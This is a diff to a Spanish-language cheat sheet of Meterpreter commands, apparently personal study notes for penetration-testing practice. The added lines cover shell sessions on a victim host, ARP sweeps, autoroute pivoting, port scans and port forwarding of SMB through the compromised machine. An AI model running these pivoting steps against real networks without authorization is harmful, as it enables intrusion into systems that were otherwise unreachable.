@@ -47,6 +47,7 @@ Es un multi-funcional payload que es ejecutado en memoria en un sistema victima 
 
 ❯ shell                      # Nos carga una shell
 	❯ /bin/bash -i          # Si no nos crea la Shell con el comando anterior, lo hacemos con este 
+	❯ exit                  # Para salir de la sesion de 'Shell' y regresar a la sesion de 'Meterpreter'
 ❯ pwd                        # Nos muestra la ruta del dir actual 
 ❯ cd /                       # Nos dirigimos a la raiz 'C:\'
 ❯ cat file.txt               # Miramos el contenido de un archivo 
@@ -57,7 +58,7 @@ Es un multi-funcional payload que es ejecutado en memoria en un sistema victima 
 ```bash 
 ❯ run arp_scanner -r IP.0/24              # Barrido ARP en la direccion IP 
 
-1. Agregar la IP a la tabla de ruteo
+1. Agregar la IP a la tabla de ruteo en Meterpreter y la conectividad es dentro de Metasploit
 ❯ run autoroute -s IP.0/24                # Agregas la IP a la tabla de ruteo para alcanzar la nueva red
 
 2. Te sales de la sesion y puedes ver la tabla de ruteo
@@ -68,11 +69,11 @@ Es un multi-funcional payload que es ejecutado en memoria en un sistema victima 
 ❯ use auxiliary/scanner/portscan/tcp      # Hacer escaneo con Nmap
 	❯ options 
 	❯ set ports 1-1000                # Escanearemos los primero 1000 puertos 
-	❯ set rhosts <IP>                 # Colocamos la IP de la maquina a la que no llegabamos y ahora si por el Pivoting
+	❯ set rhosts <IP>                 # Colocamos la IP de la maquina a la que no llegabamos porque estaba en otra red
 	❯ run 
 
-4. 
-❯ netstat                  # 
-
-❯ portfwd                  # 
+4. Haremos PortForwarding para tener conectividad fuera del Metasploit, los siguientes comandos los debemos de hacer dentro de la sesion de Meterpreter
+❯ sessions ID                          # Usas la sesion con Meterpreter 
+❯ portfwd add -l 2233 -p 445 -r IP     # IP es del nuevo hosts el cual no podiamos alcanzar, l = El puerto a abrir en nuestra maquina de atacante, p = Puerto de la maquina victima a traer
+	❯ nmap -p2233 localhost           # Ahora podemos hacer Nmap desde nuestra consola 
 ```
